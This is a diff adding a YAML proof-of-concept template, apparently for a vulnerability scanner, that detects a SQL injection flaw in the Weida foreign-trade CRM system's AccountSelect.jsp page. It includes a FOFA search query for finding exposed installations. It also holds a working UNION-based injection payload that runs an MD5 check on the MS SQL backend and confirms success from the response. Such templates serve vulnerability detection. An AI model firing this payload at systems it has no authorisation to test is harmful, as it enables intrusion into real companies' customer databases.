@@ -1,0 +1,17 @@
+id: poc-yaml-weidasoft-accountselect-sqli
+info:
+  name: 维达外贸客户关系管理系统 AccountSelect SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 维达外贸客户关系管理系统
+  fofa: title="维达外贸客户关系管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /wap/common/AccountSelect.jsp?ids=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28126%29%2Bsys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}'))%2BCHAR%28126%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+x&returnType=11
+  expression: status_code == 200 && contains(body,"window.parent.open") && contains(body,"AccountSelectCheckBoxClick")
+    && contains(gbk_decode(body),"用户选择") && contains(body,"0x" + t2)
+transport: http
